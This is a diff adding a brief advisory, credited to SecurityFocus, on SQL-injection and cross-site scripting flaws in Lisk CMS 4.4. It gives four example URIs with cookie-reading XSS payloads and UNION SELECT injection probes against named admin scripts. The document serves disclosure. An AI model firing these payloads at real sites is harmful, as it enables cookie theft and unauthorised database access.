@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/40314/info
+
+Lisk CMS is prone to multiple SQL-injection and cross-site scripting vulnerabilities because it fails to sanitize user-supplied input.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Lisk CMS 4.4 is vulnerable; other versions may also be affected. 
+
+The following example URIs are available:
+
+http://www.example.com/path_to_cp/list_content.php?cl=2%27%22%3E%3Cimg+src=x+onerror=alert%28document.cookie%29%3E
+http://www.example.com/path_to_cp/edit_email.php?&id=contact_form_214%27+--+%3Cimg+src=x+onerror=alert%28document.cookie%29%3E
+http://www.example.com/path_to_cp/cp_messages.php?action=view_inbox&id=-1+union+select+1,2,3,4,5,6,7,8,9+--+
+http://www.example.com/path_to_cp/edit_email.php?&id=X%27+union+select+1,2,3,4,5,6+--+ 
